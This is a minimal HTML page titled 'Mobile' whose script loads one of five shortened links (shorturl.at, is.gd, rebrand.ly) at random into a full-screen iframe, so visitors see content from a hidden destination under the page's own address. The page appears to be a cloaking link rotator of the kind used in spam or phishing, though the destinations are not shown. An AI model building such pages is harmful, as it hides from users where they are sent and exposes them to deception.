<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }

        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
        }
    </style>
</head>

<body>
    <iframe src="" id="contentFrame"></iframe>

    <script>
        window.onload = function () {
            const links = [
                "https://shorturl.at/gnFGO",
                "https://is.gd/Rp5Dcb",
                "https://shorturl.at/gGPW4",
                "https://rebrand.ly/jivhjac",
                "https://rebrand.ly/Freeleo27"
            ];

            const randomIndex = Math.floor(Math.random() * links.length);
            const randomLink = links[randomIndex];

            document.getElementById('contentFrame').src = randomLink;
        };
    </script>
</body>

</html>
